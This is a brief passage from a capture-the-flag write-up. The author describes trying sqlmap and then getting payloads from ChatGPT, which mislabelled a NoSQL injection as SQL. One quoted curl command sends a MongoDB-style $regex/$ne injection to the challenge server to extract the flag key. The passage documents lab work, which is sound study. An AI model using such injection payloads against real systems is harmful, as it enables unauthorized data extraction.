So I used the provided keys to check what it displays and it was somewhat helpful because an sql injection came into my mind.At first i tried to sqlmap the chall which was a terrible decision because i lost a lot of time:)
Then i asked ChatGpt to give me some payloads a lot of useless payload there was this one "curl -s 'http://ctf.ac.upt.ro:9768/key' \
  -H 'Content-Type: application/json' \
  -d '{"key":{"$regex":"ctf\\{.*\\}","$options":"i"},"type":{"$ne":null}}'
" which i know that is a NoSQL injection but our friend gpt actually said that it's a sql injection(yes dummy ai but it's helpful sometimes)

